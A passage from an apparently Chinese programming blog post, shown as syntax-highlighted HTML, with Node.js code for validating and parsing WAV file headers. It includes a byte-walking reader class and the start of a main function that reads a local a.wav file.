&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;includes&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;wav&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;BitsPerSample&lt;/span&gt;)){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;wav&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ByteRate&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;wav&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SampleRate&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;wav&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NumChannels&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;wav&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;BitsPerSample&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;wav&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;BlockAlign&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;wav&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NumChannels&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;wav&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;BitsPerSample&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; ){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;wav&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChunkSize&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fileSize&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ByteWalk&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;constructor&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      	&lt;span style=&#34;color:#75715e&#34;&gt;// 记录当前读过的字节数
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;current&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      	&lt;span style=&#34;color:#75715e&#34;&gt;// 记录整个buf
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  	&lt;span style=&#34;color:#75715e&#34;&gt;// 用来指定要读取的字节数，以及它的格式
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;step&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;current&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;arguments&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;current&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;current&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;bf&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;slice&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;current&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;current&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;bf&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;slice&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;current&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;current&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;current&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;s&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#75715e&#34;&gt;// 一个特殊的标记，用来标记按照字符串的方式读取buf
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;readStringBE&amp;#39;&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;buffer2String&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;bf&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bf&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;]();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;readData&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;step&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;read&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;step&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;read&lt;/span&gt;](&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;module&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;exports&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;buffer2String&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// validFile,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;ByteWalk&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;validWav&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;readData&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;step3-main函数&#34;&gt;step3: main函数&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fs&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fs&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;path&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;path&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;ByteWalk&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;validWav&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;readData&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;} &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./util&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fs&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;readFileSync&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;path&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;join&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;__dirname&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./a.wav&amp;#39;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ByteWalk&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 按照固定的字节数读取
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;friendData&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;ChunkID&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;step&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;readStringBE&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;ChunkSize&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;step&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;readUInt32LE&amp;#39;&lt;/span&gt;),
